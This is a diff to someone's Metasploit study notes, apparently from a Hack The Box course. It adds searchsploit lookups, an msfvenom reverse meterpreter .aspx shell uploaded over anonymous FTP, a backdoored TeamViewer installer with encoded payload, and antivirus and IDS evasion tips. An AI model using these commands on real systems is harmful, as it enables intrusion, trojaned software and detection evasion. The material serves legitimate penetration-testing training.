@@ -37,6 +37,18 @@
   - [[#extensible][Extensible]]
   - [[#using][Using]]
 - [[#writingimporting-modules][Writing/Importing modules]]
+  - [[#searching][searching]]
+- [[#msfvenom][MSFVenom]]
+  - [[#creating-payload][Creating payload]]
+  - [[#exec-payload][exec payload]]
+  - [[#local-exploit-suggester][Local Exploit Suggester]]
+- [[#firewall--ipsids-evasion][Firewall & IPS/IDS Evasion]]
+  - [[#endpoint-protection][Endpoint Protection]]
+  - [[#security-policies][Security Policies]]
+  - [[#evasion-techniques][Evasion Techniques]]
+  - [[#archives][Archives]]
+  - [[#packers][Packers]]
+  - [[#exploit-coding][Exploit Coding]]
 
 * MSF engagement structure
 - Enumeration
@@ -70,7 +82,7 @@ contains exploit && shellcode for sel task.
 
 **** Stager
 work with [[#stage][stage]]. perform spec task.
-- runs on victim machine. 
+- runs on victim machine.
 - initiates outbound connection to attacker's listener
 - designed to be small & reliable
 - default -> appr stager for given scenario (fallback -> less-preferred)
@@ -145,7 +157,7 @@ x86/shikata_ga_nai succeeded with size 381 (iteration=0)
 x86/shikata_ga_nai chosen with final size 381
 Payload size: 381 bytes
 Final size of perl file: 1674 bytes
-my $buf = 
+my $buf =
 "\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
 "\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
 "\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
@@ -217,7 +229,7 @@ folders in project
      2. Subnet
      3. network
      4. domain
-        
+
 - view -> ~workspace~
 - add -> ~workspace -a~
 - delete -> ~workspace -d~
@@ -226,7 +238,7 @@ folders in project
 ~db_import Target.xml~
 - After the import is complete, we can check the presence of the host's information in our database by using the hosts and services commands.
 # Note that the .xml file type is preferred for db_import
- 
+
 ** Using Nmap inside MSFconsole
 ~df_nmap~
 
@@ -254,7 +266,7 @@ folders in project
   - hashes
   - passwd
   - shadow
-    
+
 * Plugins
 - need to ensure is installed
 - check =/usr/share/metasploit-framework/plugins=
@@ -265,7 +277,7 @@ folders in project
 - +inheritance+ inclusion
 - ~include~ with modules passes as param
 - [[https://en.wikibooks.org/wiki/Metasploit/UsingMixins][mixins]]
-  
+
 * Sessions
 - dedicated control interfaces for deployed module
 
@@ -279,7 +291,7 @@ can bg session as long as they form channel of comms w target host
 - ~exploit -j~ -> run exploit as job
 - ~jobs -l~ -> list jobs (kill using ~kill [idx]~)
 - ~jobs -K~ -> kill all running jobs
-  
+
 *** TODO DO LAB 2 AGAIN
 
 * Meterpreter
@@ -311,7 +323,7 @@ after exec:
 uses channelised comms system b/w target host and attacker.
 - allows for AES encrypted traffic
 
-** Extensible 
+** Extensible
 augmented at runtime & loaded over network. allows new functionality to be added w/out rebuilding (*modular*)
 
 ** Using
@@ -323,5 +335,221 @@ augmented at runtime & loaded over network. allows new functionality to be added
 - ~hashdump~
 - ~lsa_dump_sam~
 - ~lsa_dump_secrets~
-  
+
 * Writing/Importing modules
+** searching
+- search in [[https://www.exploit-db.com/][ExploitDB]]
+  - search w tag [[https://www.exploit-db.com/?tag=3][MSF]]
+- dir -> =/usr/share/metasploit-framework/=
+- local symlinked -> =~/.msf4=
+#+begin_src bash
+biscuitrescue@htb[/htb]$ searchsploit nagios3
+
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
+Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
+Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
+Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+#+end_src
+#+begin_src bash
+biscuitrescue@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
+
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
+Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
+Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+#+end_src
+*** Loading additional modules at runtine
+#+begin_src bash
+biscuitrescue@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+biscuitrescue@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
+#+end_src>
+*** Loading additional modules
+#+begin_src bash
+msf6> loadpath /usr/share/metasploit-framework/modules/
+#+end_src>
+- can also run ~reload_all~
+* MSFVenom
+- successor of =msfpayload= =msfencode=
+** Creating payload
+- found open FPT port w weak creds or open to anon login
+**** Scanning Target
+- ~nmap~
+**** FTP Anon access
+#+begin_src bash
+biscuitrescue@htb[/htb]$ ftp 10.10.10.5
+
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+
+
+Name (10.10.10.5:root): anonymous
+
+331 Anonymous access allowed, send identity (e-mail name) as password.
+
+
+Password: ******
+
+230 User logged in.
+Remote system type is Windows_NT.
+
+
+ftp> ls
+
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+#+end_src
+- =aspnet_client= -> box will be able to run =.aspx= rev shells
+
+**** Generating payload
+#+begin_src bash
+biscuitrescue@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2819 bytes
+#+end_src
+- need to upload to FTP server.
+~ftp > put reverse_shell.aspx~
+- Navigate to =http://10.10.10.5/reverse_shell.aspx= -> trigger =.aspx= payload
+
+**** Setting up multi/handler
+~use multi/handler~
+
+** exec payload
+*** Meterpreter shell
+#+begin_src bash
+<...SNIP...>
+[*] Started reverse TCP handler on 10.10.14.5:1337 
+
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000
+
+
+meterpreter > getuid
+
+Server username: IIS APPPOOL\Web
+
+
+meterpreter > 
+
+[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
+#+end_src
+** Local Exploit Suggester
+*** Local Privilege Escalation
+~search kitrapod~
+
+* Firewall & IPS/IDS Evasion
+** Endpoint Protection
+- any localised dev/serv whose sole purpose is to protect single host on net
+
+- comes in form of software packs (=Antivirus Protection=, =Antimalware Protection=, =Firewall=, =Anti-DDOS= in same package)
+  
+*** Perimeter Protection
+- comes in physical/virtualised devs on network Perimeter edge.
+- =edge devs= provide access inside of network from outside. (=public= to =pvt=)
+- can find =DMZ= between =public= & =priv=
+**** DMZ
+- Lower-sec policy level zone than inside net, but higher trust than outside.
+- virtual space where public-facing servers are housed
+  - push, pull data for public clients from internet, but also managed from inside and updated w patches, info etc
+** Security Policies
+- fn() same way as =ACLs=
+- list of =allow= and =deny= stmts -> dictate how traffic/files can exist w/in config.
+- can target different features of net & hosts depending on where they reside:
+  + Network Traffic Policies 
+  + Network Traffic Policies
+  + Application Policies
+  + User Access Control Policies
+  + File Management Policies
+  + DDoS Protection Policies
+  + Others
+
+**** Security Policies:
+***** Signature-based
+The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.
+***** Heuristic / Statistical Anomaly Detection
+Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.
+***** Stateful Protocol Analysis Detection
+Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.
+***** Live-monitoring and Alerting (SOC-based)
+A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.
+** Evasion Techniques
+- most host-based AV software rely on =Signature-based Detection= to id aspects of malicious code.
+- these signatures places inside AV Engine -> used to scan storage space & running procs for matches
+- [[https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/][US Govt Post-Mortem report on Equifax Hack]]
+- [[https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411][Protecting from DNS Exfil]]
+- [[https://channelpostmea.com/wp-content/uploads/2017/08/infoblox-whitepaper-data-exfiltration-and-dns-closing-the-back-door.pdf][Stopping data Exfil and Malware Spread through DNS]]
+
+*** What happens to payload after reaching dest
+- could be fingerprinted for signature, matched against DB, blocked
+
+*** Embedding payload into executable
+- ~-k~ -> trigger continuation of normal exec of launched app while pulling payload in separate thread from main.
+- target will notice backdoor when running from CLI. Separate window will pop up w payload.
+#+begin_src bash
+biscuitrescue@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/Desktop/TeamViewer_Setup.exe
+#+end_src
+
+** Archives
+- archiving info (file, folder, script, exe, pic, doc) and placing passwd on archive bypasses lots of common anti-virus signatures.
+- Downside -> raised as notif in AV alarm dashboard as being unable to be scanned d/t being locked w passwd.
+
+*** Generating payload
+#+begin_src bash
+biscuitrescue@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/test.js
+#+end_src
+
+*** archiving
+- archive x2
+
+** Packers
+- result of =executable compression= process where payload packed w exec program w decompression code in single file.
+- [[https://jon.oberheide.org/files/woot09-polypack.pdf][Polypack Project]]
+
+  
+** Exploit Coding
+- =buff overflow= -> easily distinguished from regular traffic on network d/t hex buffer patterns.
+- randomisation can help add variation to those patterns. -> break IPS/IDS db signatures for well-known exploit buffers.
+  - can be done by inputting =Offset= switch inside code for msfconsole value
+
+- [[https://nostarch.com/metasploit][exploit coding]]
+
